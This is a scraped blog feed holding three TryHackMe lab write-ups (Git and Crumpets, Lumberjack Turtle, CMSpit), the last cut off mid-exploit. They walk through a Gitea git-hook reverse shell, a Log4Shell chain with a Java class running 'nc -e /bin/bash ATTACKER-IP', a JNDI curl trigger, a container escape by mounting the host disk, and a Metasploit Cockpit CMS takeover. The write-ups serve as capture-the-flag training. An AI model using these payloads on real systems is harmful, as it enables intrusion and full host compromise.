;ii;;;i;;;;iiiiiiii;;;;;;;;;;;;;;;;;;;;iiiiiiii#xMWMMMMMWWWWWMMWWWW@@@@@@@@WxxMxxxMMMMxxxMMWWWWWW@@@@@@@@@@@@@@@@WWWW@WMz*iiiiiiiiiiiiiiiiiiiiiiiiiiii ;ii;;;ii;iiiiiiiiii;;;;;;;;;;;;;;;;;;;;iiiiiiii#xMMMMMxxxMMx##zxWWW@@@@@@@WWxxxxxxxxxxxMMMMMMMMWW@@@@@@@@@@@@@@@@@WWWWMx+*iiiiiiiiiiiiiiiiiiiiiiiiiiii iiiiiiiiiiiiiiiiiii;;;;;;;;;;i;;;;;iii;iiiiiiii#xMMMMxxxMMn++#zxWWW@@@@@@@WWxxxxxnnnnxxxnxMMWWWWW@@@@@@@@@@@@@@@@@@WWWx#**iiiiiiiiiiiiiiiiiiiiiiiiiiii iiiiiiiiiiiiiiiiiiii;;;;;;;;;ii;;;;iiiiiiiiiiii+xMMMMMMnz#++#zzxWWW@@@@@@@@WxnxxxxxxxMMxxxxMxMMWW@@@@@@@@@@@@@@@@@@WMx+**iiiiiiiiiiiiiiiiiiii;ii;iiiii iiiiiiiiiiiiiiiiiiiiiiiii;;;iiii;;iiiiiiiiiiiiii#nMMxM#***+#zzzxWWW@@@@@@@WWxnMMMMMMMMMMMMMMWWWWWW@@@@@@@@WWW@@@@WWMz+***iiiiiiiiiiiiiiiiiiiiiiiiiiiii iiiiiiiiiiiiiiiiiii;;;;ii;;;;ii;;;iiiiiiiiiiiiiii#xxxn++##zzzzzxWW@@@@@@@@WWxnxxxxMMMxxxxxMMMMMMMWW@@@@@@@@WW@@@WWMn+***iiiiiiiiiiiiiiiiiiiiiiiiiiiiii iiiiiiiiiiiiiiiiiii;;;;ii;;;;i;;;;;;iiiiiiiiiiiii+xxxzzzzzzznnnxW@@@@@@@@@@WxnxxnnnnnnnnnnxMMMMWWWWWWW@@@@@@@@@WWMMx#***iiiiiiiiiiiiiiiiiiiiiiiiiiiiii iiiiiiiiiiiiiiiiiii;;;;i;;;;;i;;;;;;;;iiiiiiiiiiizxMMnzzzzzznnnMW@@@@@@@@@@WxxxxxxxMMMWWWMMWWWWMWWWWWWW@@@@@@@WWMMMMx+***iiiiiiiiiiiiiiiiiiiiiiiiiiiii iiiiiiiiiiiiiiiiiii;;;;i;;;;i;;;;;;;;;iiiiiiiiiiizxMMnzzzzzzznnxW@@@@@@@@@@WxxxnxxMMWWMMWMMxMWMxMW@@WWWW@@@@@@WWMMMMMn+***iiiiiiiiiiiiiiiiiiiiiiiiiiii Never gonna give you up, Never gonna let you down... \u0026lt;/pre\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Gitea In the comments we see a hostname called git.git-and-crumpets.thm . Added it to /etc/hosts file \u0026amp; visited the page.\nIt\u0026rsquo; a Gitea page.\nGitea is an open-source forge software package for hosting software development version control using Git as well as other collaborative features like bug tracking, wikis and code review.\nViewing the source code reveals the version of gitea as 1.14.0\nShell as git Create an account in signup page and log in to the account.\nHere we have 3 repositories cant-touch-this, hello world.\nThere are 4 users hydra, root groot, scones\u0026amp; test other than the account which I created.\nVisit the cant-touch-this repository which the user scones owns .\nThere are 5 commits in this repo. Here there is a comment in one of the commits mentioning that the user scones has stored his password in his avatar.\nUsing exiftool to retrieve user scones password .\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/gitsandcrumpets] ‚îî‚îÄ# exiftool 3fc2cde6ac97e8c8a0c8b202e527d56d.png ExifTool Version Number : 12.36 File Name : 3fc2cde6ac97e8c8a0c8b202e527d56d.png Directory : .. File Size : 279 KiB File Modification Date/Time : 2022:02:10 10:09:37-05:00 File Access Date/Time : 2022:02:10 10:09:37-05:00 File Inode Change Date/Time : 2022:02:10 10:09:37-05:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 290 Image Height : 290 Bit Depth : 16 Color Type : RGB Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Description : My \u0026#39;Password\u0026#39; should be easy enough to guess Image Size : 290x290 Megapixels : 0.084 Now after logging in to the website as scones ,we see that the user has access to modify git hooks .\nGit hooks are scripts that run automatically every time a particular event occurs in a Git repository.\nCVE-2020-14144 There is a CVE exploit for git hooks feature in Gitea 1.1.0 to 1.12.5 through which we could get a reverse shell . This works for Blog post for this Githooks RCE - https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/\nEdit the contents of git-hook with a reverse shell one-liner \u0026amp; click on Update hook.\nMake changes in README.md file \u0026amp; commit the changes to trigger a callback.\nWe get a connection back on our machine \u0026amp; we are user git on the machine!\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/gitsandcrumpets/cant-touch-this] ‚îî‚îÄ# nc -lvnp 9001/9001 0\u0026gt;\u0026amp;1 listening on [any] 9001 ... connect to [10.17.6.87] from (UNKNOWN) [10.10.59.255] 37618 bash: cannot set terminal process group (869): Inappropriate ioctl for device bash: no job control in this shell [git@git-and-crumpets cant-touch-this.git]$ whoami git I uploaded my ssh-public keys and ssh\u0026rsquo;ed into the machine \u0026amp; grabbed the user flag üö©.\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~] ‚îî‚îÄ# ssh git@10.10.59.255 -i id_rsa Last failed login: Thu Feb 10 16:59:14 CET 2022 from 10.17.6.87 on ssh:notty There were 2 failed login attempts since the last successful login. Last login: Sat Apr 17 23:07:52 2021 [git@git-and-crumpets ~]$ ls -al total 20 drwx------. 3 git git 129 Apr 15 2021 . drwxr-xr-x. 4 root root 35 Apr 14 2021 .. lrwxrwxrwx. 1 git git 9 Apr 15 2021 .bash_history -\u0026gt; /dev/null -rw-r--r--. 1 git git 18 Jul 21 2020 .bash_logout -rw-r--r--. 1 git git 141 Jul 21 2020 .bash_profile -rw-r--r--. 1 git git 376 Jul 21 2020 .bashrc -rw-r--r--. 1 git git 162 Apr 14 2021 .gitconfig drwx------. 2 git git 29 Apr 14 2021 .ssh -r--------. 1 git git 53 Apr 15 2021 user.txt [git@git-and-crumpets ~]$ cat user.txt dGhte2ZkN2Fi*********jZDcwY2YzZDZhYTE2fQ== [git@git-and-crumpets ~]$ cat user.txt | base64 -d thm{fd7ab9f*********d6aa16} Shell as root By default gitea logs all its data into /var/lib/gitea.\n[git@git-and-crumpets data]$ pwd /var/lib/gitea/data ## sqlite3 db [git@git-and-crumpets data]$ ls -al total 1288 drwxr-x---. 11 git git 170 Feb 10 16:51 . drwxr-xr-x. 5 git git 57 Apr 15 2021 .. drwxr-xr-x. 2 git git 6 Apr 14 2021 attachments drwxr-xr-x. 3 git git 217 Feb 10 16:45 avatars -rw-r--r--. 1 git git 1318912 Feb 10 16:45 gitea.db drwxr-xr-x. 5 git git 45 Apr 15 2021 gitea-repositories drwxr-xr-x. 4 git git 46 Apr 14 2021 indexers drwxr-xr-x. 2 git git 6 Apr 14 2021 lfs drwxr-xr-x. 7 git git 114 Apr 14 2021 queues drwxr-xr-x. 2 git git 6 Apr 14 2021 repo-avatars drwx------. 15 git git 123 Feb 10 16:35 sessions drwxr-xr-x. 3 git git 24 Feb 10 16:51 tmp We have an gitea.db file here. Examine the db file.\nsqlite\u0026gt; .tables access org_user access_token project action project_board attachment project_issue collaboration protected_branch comment public_key commit_status pull_request deleted_branch reaction deploy_key release email_address repo_indexer_status email_hash repo_redirect external_login_user repo_topic follow repo_transfer gpg_key repo_unit gpg_key_import repository hook_task review issue session issue_assignees star issue_dependency stopwatch issue_label task issue_user team issue_watch team_repo label team_unit language_stat team_user lfs_lock topic lfs_meta_object tracked_time login_source two_factor milestone u2f_registration mirror upload notice user notification user_open_id oauth2_application user_redirect oauth2_authorization_code version oauth2_grant watch oauth2_session webhook sqlite\u0026gt; SELECT * FROM user; 1|hydra|hydra||hydragyrum@example.com|0|enabled|9b020d3e158bc31b5fe64d668d94cab38cadc6721a5fdf7a4b1fb7bf97021c5e68f56bd9bd44d5ce9547e5e234086342c4e4|pbkdf2|0|0|0||0|||XGySX7uBlc|3C4NzJWN9e|en-US||1618386984|1621615239|1621614217|0|-1|1|1|0|0|0|0|0|d91f03c868d38ecf84ab3cc54f876106|hydragyrum@example.com|1|0|0|0|1|0|0|0|0|unified|arc-green|0 2|root|root|groot|root@example.com|0|enabled|2181d2b5fbf1859db426bcb94d97851d9a0e87a5eb47c5edc7f92bffc45b679e554c8367084f379e59936b68c0d770823ec9|pbkdf2|0|0|0||0|||2VK8fSxvIZ|5e5xPrzvBr|en-US||1618391049|1621716065|1621716065|1|-1|1|0|1|0|0|0|0|b2b218891f86ea980812a5b934ecec1a|root@examle.com|1|0|0|0|1|0|0|0|0|unified|gitea|0 3|scones|scones||withcream@example.com|0|enabled|8d0386b217e0f1ad5a1012d879ce93c9d77fd79d888410fdee9e76ec58d6fa017042906dd9a2ea498d3fd5a7486a73875660|pbkdf2|0|0|0||0|Her Majesty\u0026#39;s Secret Service||IF60pw0rVc|13y4Vtc2AH|en-US|I like scones.|1618492621|1644507952|1644507952|0|-1|1|0|0|1|0|0|0|3fc2cde6ac97e8c8a0c8b202e527d56d|jackel@example.com|1|0|0|0|1|0|0|0|0|unified|gitea|0 4|test|test||test@test.thm|0|enabled|d3463d9c205751364af7850bca7956d0f5cc0eb125a097db54fd0087eec31cec1912245e57fdfc53423a89e6684a15f8939a|pbkdf2|0|0|0||0|||oe4oKzc3mk|EgtShiimON|en-US||1618526457|1618526530|1618526457|0|-1|1|0|0|0|0|0|0|15c9bc2cfbc7b7fd0b627422d8189173|test@test.thm|0|0|0|0|0|0|0|0|0|unified|gitea|0 5|shebu|shebu||shebu@gits.thm|0|enabled|e4d2b4f6680ab31ec40dfa49e4aac7fec580db3e67d9ec9ff31267db26f70e98fc9ad86db9cf05b5f313274bf30c30de7163|pbkdf2|0|0|0||0|||fdbwIzFByW|IIserdA0R2|en-US||1644507919|1644507920|1644507919|0|-1|1|0|0|0|0|0|0|6790b3c717baa3412054f123049a7205|shebu@gits.thm|0|0|0|0|0|0|0|0|0||gitea|0 Update our permissions to root user.\nsqlite\u0026gt; UPDATE user SET is_admin=1 WHERE id=3; Now if we visit the website we see a private repository called backups owned by root!\nWe have 2 branches in here master \u0026amp; dotfiles.\nThe dotfiles branch has 4 commits. We see that the root user added his ssh keys and then deleted it.\nLets now grab the SSH private key and ssh into the box as root to grab the root flag!üö©\nNOTE - The name of the file is the passphrase required to ssh in as root.\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/gitsandcrumpets] ‚îî‚îÄ# ssh root@git.git-and-crumpets.thm -i id_rsa Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Last login: Sat Jul 3 21:36:13 2021 from 192.168.247.1 [root@git-and-crumpets ~]# id uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 [root@git-and-crumpets ~]# cat /root/root.txt dGhtezYzMjAy*********g4NzI0MGRjNmExfQ== [root@git-and-crumpets ~]# cat /root/root.txt | base64 -d thm{6320228d*********7240dc6a1} ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/gitandcrumpets/","summary":"Git and Crumpets is a medium difficulty box from tryhackme which is mostly based on git. We get a shell on the box using a CVE in gitea\u0026rsquo;s git hooks functionality .For root, we change the permissions of the git user to root user. Now we were able to see a private repository owned by root which had root user\u0026rsquo;s ssh private key through which we login as root to get the root flag.","title":"GitandCrumpets - THM"},{"content":"Lumberjack Turtle is a medium difficulty box from Tryhackme which is entirely focused on Log4j/Log4shell a 0-day vulnerability that caused a havoc on the internet . The website is vulnerable to Log4j \u0026amp; so we\u0026rsquo;re able to exploit it and get a shell on the box . We find a .dockerenv file in the / directory which indicates we are on a docker container. To obtain the root flag , we mount the /dev/xvda1 disk partition since it contains the entire filesystem(/) to access all the files .\nRoom OS Linux Difficulty Medium Room Link https://tryhackme.com/room/lumberjackturtle Creator SilverStr Enumeration Portscan ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/Lumberjackturtle] ‚îî‚îÄ$ nmap -sCV lumberjackturtle.thm -oN lumberjack.thm Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 04:56 EST Nmap scan report for lumberjackturtle.thm (10.10.241.157) Host is up (0.32s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA) | 256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA) |_ 256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519) 80/tcp open nagios-nsca Nagios NSCA |_http-title: Site doesn\u0026#39;t have a title (text/plain;charset=UTF-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.92 seconds Website - port 80 The homepage of the website has only this comment .It gives us a hint as java and also to bruteforce the directories.\nDirectory bruteforcing /~logs ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/Lumberjackturtle] ‚îî‚îÄ$ dirsearch -u http://lumberjackturtle.thm -w /usr/share/wordlists/dirb/common.txt _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 Wordlist size: 4613 Output File: /home/shebu/.dirsearch/reports/lumberjackturtle.thm/_22-01-28_05-01-17.txt Error Log: /home/shebu/.dirsearch/logs/errors-22-01-28_05-01-17.log Target: http://lumberjackturtle.thm/ [05:01:17] Starting: [05:01:21] 200 - 29B - /~logs [05:01:34] 500 - 73B - /error Task Completed Now lets visit /~logs directory .\nAgain it tells us to go deeper !\n/log4j ‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/Lumberjackturtle] ‚îî‚îÄ$ dirsearch -u http://lumberjackturtle.thm/~logs/ -w /usr/share/wordlists/dirb/common.txt _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 4613 Output File: /home/shebu/.dirsearch/reports/lumberjackturtle.thm/~logs_22-01-28_06-10-12.txt Error Log: /home/shebu/.dirsearch/logs/errors-22-01-28_06-10-12.log Target: http://lumberjackturtle.thm/~logs/ [06:10:12] Starting: [06:10:52] 200 - 47B - /~logs/log4j Task Completed Seems like a dead end. The comment here tells us that its vulnerabele\nShell as Docker root Testing for log4j The Log4shell (CVE-2021‚Äì44228) vulnerability affects how Log4j processes log messages. By sending specially crafted messages to a system that uses Log4j, a threat actor can cause the system to load external code, leading to an RCE.\nAttackers can take advantage of it by just inserting a line of code like ${jndi:ldap://[attacker_URL]}\nIntercept the request in burp and send it to repeater tab. Set up a netcat listener on your terminal to look for any incoming connections .\nFirst lets test for log4j on User-Agent header.\nWe get a hint in response - CVE-2021-44228 IN X-Api-Version .\nTesting it again but this time sending out payload in X-Api-version header.\nWe dont get any response back which is a good sign .It means we\u0026rsquo;ve got a connection back in our netcat session.\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/Lumberjackturtle] ‚îî‚îÄ$ sudo nc -lvnp 53 listening on [any] 53 ... connect to [10.8.106.23] from (UNKNOWN) [10.10.197.211] 50810 0 `ÔøΩ RCE using log4j Now we need to get a shell to move further.\nExploit This is how it works\nWhen we send the payload ${jndi:ldap://attackerserver:1389/Exploit} - it reaches out to our LDAP server . The LDAP server forwards the request to our secondary server asking for the resource located at http://attackerserver:8000/Exploit . Secondary server serves the Exploit.class file. After retreiving , the victim_server executes the code present in Exploit.class (which is basically a reverse shell) Once it executes , we get a reverse shell back on our netcat . I\u0026rsquo;ll explain the steps one by one , just follow me along .\nFirst things first we need java version 8 on our machine in order to build the LDAP server .Create 4 terminal windows and follow the steps.\nNote : Change VICTIM-IP with your Machine_IP and ATTACKER-IP to your tun0 IP!\nLDAP server (Terminal 1) Steps:\nTo exploit this issue, we need to have a malicious LDAP server. Marshalsec Utility can be used for this part .Git clone the repository. LINK - https://github.com/mbechler/marshalsec . Run sudo apt install maven to install Java builder maven. cd marshalsec (move into the cloned repository) RUN - mvn clean package -DskipTests (build marshalsec utility) RUN - java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer ‚Äúhttp://ATTACKER-IP:8000/#Exploit\u0026quot; (start LDAP referal server) Secondary HTTP server (Terminal 2) This is used to serve the Exploit.class file when the victim server requests it.\nContents of Exploit.java file üëáüèª\npublic class Exploit { static { try { java.lang.Runtime.getRuntime().exec(\u0026#34;nc -e /bin/bash ATTACKER-IP 9999\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } Steps:\nCreate a file named Exploit.java with the following contents mentioned above RUN - javac Exploit.java -source 8 -target 8 (compile the payload file) Now new file called Exploit.class is created. RUN - python3 -m http.server (start a local server) Netcat listener (Terminal 3) This is used to catch the reverse shell after the victim_server retreives \u0026amp; executes our malicious Exploit.class file.\nnc -lvnp 9999 Trigger the exploit (Terminal 4) curl -X GET http://VICTIM-IP/~logs/log4j/ -H \u0026#39;X-Api-Version: ${jndi:ldap://Attacker-IP:1389/Exploit\\}\u0026#39; And we get a shell back on our nc\n‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/thm/Lumberjackturtle] ‚îî‚îÄ$ nc -lvnp 9999 listening on [any] 9999 ... connect to [10.8.106.23] from (UNKNOWN) [10.10.244.37] 42387 whoami root user.txt üö© So we are user root. Hmm Wierd !\nDocker_env Listing all the files in the / directory we see a .dockerenv which means we are in a docker container .\nFirst lets grab the *user.txt flag before escalating our privileges. user flag was neither in the /home directory nor in the /root directory in the docker container. On further enumeration I found the user flag in /opt\n# cd /opt /opt # ls -la total 12 drwxr-xr-x 1 root root 4096 Dec 11 21:04 . drwxr-xr-x 1 root root 4096 Dec 13 01:26 .. -rw-r--r-- 1 root root 19 Dec 11 21:04 .flag1 /opt # cat .flag1 THM{LOG*****W} root.txt docker escape Running fdisk command shows that the / filesytem of the machine is mounted in /dev/xvda1 .\n# fdisk -l Disk /dev/xvda: 40 GiB, 42949672960 bytes, 83886080 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x3650a2cc Device Boot Start End Sectors Size Id Type /dev/xvda1 * 2048 83886046 83883999 40G 83 Linux Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/xvdf: 1 GiB, 1073741824 bytes, 2097152 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Lets create a new directory called realroot in /tmp directory \u0026amp; mount the partition there.\n# mkdir /tmp/realroot # mount /dev/xvda1 /tmp/realroot # ls -al /tmp/realroot total 100 drwxr-xr-x 22 root root 4096 Jan 30 15:48 . drwxrwxrwt 1 root root 4096 Jan 30 16:32 .. drwxr-xr-x 2 root root 4096 Dec 8 16:04 bin drwxr-xr-x 3 root root 4096 Dec 8 16:03 boot drwxr-xr-x 4 root root 4096 Dec 8 16:03 dev drwxr-xr-x 94 root root 4096 Dec 13 02:21 etc drwxr-xr-x 3 root root 4096 Dec 13 01:25 home lrwxrwxrwx 1 root root 34 Dec 8 16:02 initrd.img -\u0026gt; boot/initrd.img-4.15.0-163-generic lrwxrwxrwx 1 root root 34 Dec 8 16:02 initrd.img.old -\u0026gt; boot/initrd.img-4.15.0-163-generic drwxr-xr-x 20 root root 4096 Dec 13 01:24 lib drwxr-xr-x 2 root root 4096 Dec 8 15:56 lib64 drwx------ 2 root root 16384 Dec 8 16:05 lost+found drwxr-xr-x 2 root root 4096 Dec 8 15:53 media drwxr-xr-x 2 root root 4096 Dec 8 15:53 mnt drwxr-xr-x 3 root root 4096 Dec 13 01:25 opt drwxr-xr-x 2 root root 4096 Apr 24 2018 proc drwx------ 4 root root 4096 Dec 13 01:25 root drwxr-xr-x 3 root root 4096 Dec 8 16:04 run drwxr-xr-x 2 root root 4096 Dec 13 01:24 sbin drwxr-xr-x 2 root root 4096 Dec 8 15:53 srv drwxr-xr-x 2 root root 4096 Apr 24 2018 sys drwxrwxrwt 8 root root 4096 Jan 30 15:51 tmp drwxr-xr-x 12 root root 4096 Dec 13 01:25 usr drwxr-xr-x 12 root root 4096 Dec 13 01:24 var lrwxrwxrwx 1 root root 31 Dec 8 16:02 vmlinuz -\u0026gt; boot/vmlinuz-4.15.0-163-generic lrwxrwxrwx 1 root root 31 Dec 8 16:02 vmlinuz.old -\u0026gt; boot/vmlinuz-4.15.0-163-generic root.txt üö© Now it is little tricky here since the root.txt doesn\u0026rsquo;t have the flag but has this comment.\n/tmp/realroot/root # ls -al total 28 drwx------ 4 root root 4096 Dec 13 01:25 . drwxr-xr-x 22 root root 4096 Jan 30 15:48 .. drwxr-xr-x 2 root root 4096 Dec 13 01:25 ... -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc -rw-r--r-- 1 root root 148 Aug 17 2015 .profile drwx------ 2 root root 4096 Dec 13 01:23 .ssh -r-------- 1 root root 29 Dec 13 01:25 root.txt /tmp/realroot/root # cat root.txt Pffft. Come on. Look harder. If you notice well , there is a ... directory. So cd into the directory and grab the root.txt flag üéâ.\n/tmp/realroot/root # cd ... /tmp/realroot/root/... # ls -al total 12 drwxr-xr-x 2 root root 4096 Dec 13 01:25 . drwx------ 4 root root 4096 Dec 13 01:25 .. -r-------- 1 root root 26 Dec 13 01:25 ._fLaG2 /tmp/realroot/root/... # cat ._fLaG2 THM{C0NT4******W} ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/lumberjackturtle/","summary":"Lumberjack Turtle is a medium difficulty box from Tryhackme which is entirely focused on Log4j/Log4shell a 0-day vulnerability that caused a havoc on the internet . The website is vulnerable to Log4j \u0026amp; so we\u0026rsquo;re able to exploit it and get a shell on the box . We find a .dockerenv file in the / directory which indicates we are on a docker container. To obtain the root flag , we mount the /dev/xvda1 disk partition since it contains the entire filesystem(/) to access all the files .","title":"Lumberjack Turtle - THM"},{"content":"Description This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities. You\u0026rsquo;ve identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.\nYour mission is to exploit these vulnerabilities and compromise the web server.\nRoom name CMSpit OS Linux Difficulty Medium Room Link https://tryhackme.com/room/cmspit Creator stuxnet Recon Portscan sh3bu@VM:~/thm/cmspit$ rustscan -a cmspit.thm --range 0-65535 -- -sV -sC -oN cmspit.nmap # Nmap 7.80 scan initiated Fri Dec 24 22:28:19 2021 as: nmap -vvv -p 22,80 -sV -sC -oN /home/sh3bu/thm/cmspit/cmspit.nmap 10.10.55.236 Nmap scan report for 10.10.55.236 Host is up, received syn-ack (0.37s latency). Scanned at 2021-12-24 22:28:20 IST for 32s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN | 256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk= | 256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) | http-title: Authenticate Please! |_Requested resource was /auth/login?to=/ |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Dec 24 22:28:52 2021 -- 1 IP address (1 host up) scanned in 33.18 seconds So there are 2 ports open as usual 22 \u0026amp; 80\nWebsite - Port 80 The home page of this website redirects to url http://cmspit.thm/auth/login?to=/ and it looks like this\nlogin page A normal login page with username \u0026amp; password .\nforgot-password page Forgot password page at http://cmspit.thm/auth/forgotpassword\nWappalyzer didnt reveal much info on version of this CMS. Taking a close look at the source code reveals the version information of cockpit-cms which is 0.11.1\nShell as www-data Googling for exploits for CMSpit 0.11.1 revealed that there are 2 CVE\u0026rsquo;s which on combined together can help us to get a foothold on the machine\nCVE-2020-35848 \u0026amp; CVE-2020-35847 - Cockpit CMS before version 0.11.2 is vulnerable to a NoSQL Injection vulnerability in the /auth/resetpassword and /auth/newpassword that allows extraction of password reset tokens which allow for user details enumeration as well as password reset msf msf6 \u0026gt; search cockpit Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/cockpit_cms_rce 2021-04-13 normal Yes Cockpit CMS NoSQLi to RCE Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce msf6 \u0026gt; use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(multi/http/cockpit_cms_rce) \u0026gt; show options Module options (exploit/multi/http/cockpit_cms_rce): Name Current Setting Required Description ---- --------------- -------- ----------- ENUM_USERS true no Enumerate users Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The URI of Cockpit USER no User account to take over VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic Target msf6 exploit(multi/http/cockpit_cms_rce) \u0026gt; set LHOST tun0 LHOST =\u0026gt; tun0 msf6 exploit(multi/http/cockpit_cms_rce) \u0026gt; set RHOSTS cmspit.thm RHOSTS =\u0026gt; cmspit.thm msf6 exploit(multi/http/cockpit_cms_rce) \u0026gt; run [*] Started reverse TCP handler on 10.17.6.87:4444 [*] Attempting Username Enumeration (CVE-2020-35846) [+] Found users: [\u0026#34;admin\u0026#34;, \u0026#34;darkStar7471\u0026#34;, \u0026#34;skidy\u0026#34;, \u0026#34;ekoparty\u0026#34;] [-] Exploit aborted due to failure: bad-config: 10.10.103.36:80 - User to exploit required [*] Exploit completed, but no session was created. Now we have 4 users admin, darkStar7471, skidy and ekoparty.\nOnto the second part of the exploit i.e password reset\nUpdate the USER value in msf to admin to reset admin\u0026rsquo;s password and re-run the exploit to get a shell !\nmsf6 exploit(multi/http/cockpit_cms_rce) \u0026gt; set USER admin USER =\u0026gt; admin msf6 exploit(multi/http/cockpit_cms_rce) \u0026gt; run [*] Started reverse TCP handler on 10.17.6.87:4444 [*] Attempting Username Enumeration (CVE-2020-35846) [+] Found users: [\u0026#34;admin\u0026#34;, \u0026#34;darkStar7471\u0026#34;, \u0026#34;skidy\u0026#34;, \u0026#34;ekoparty\u0026#34;] [*] Obtaining reset tokens (CVE-2020-35847) [+] Found tokens: [\u0026#34;rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23\u0026#34;] [*] Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23 [*] Obtaining user info [*] user: admin [*] name: Admin [*] email: admin@yourdomain.de [*] active: true [*] group: admin [*] password: $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq [*] i18n: en [*] _created: 1621655201 [*] _modified: 1621655201 [*] _id: 60a87ea165343539ee000300 [*] _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23 [*] md5email: a11eea8bf873a483db461bb169beccec [+] Changing password to A98N9259vM [+] Password update successful [*] Attempting login [+] Valid cookie for admin: 8071dec2be26139e39a170762581c00f=urekd0hbqla32mqdr1rq1ppnhm; [*] Attempting RCE [*] Sending stage (39282 bytes) to 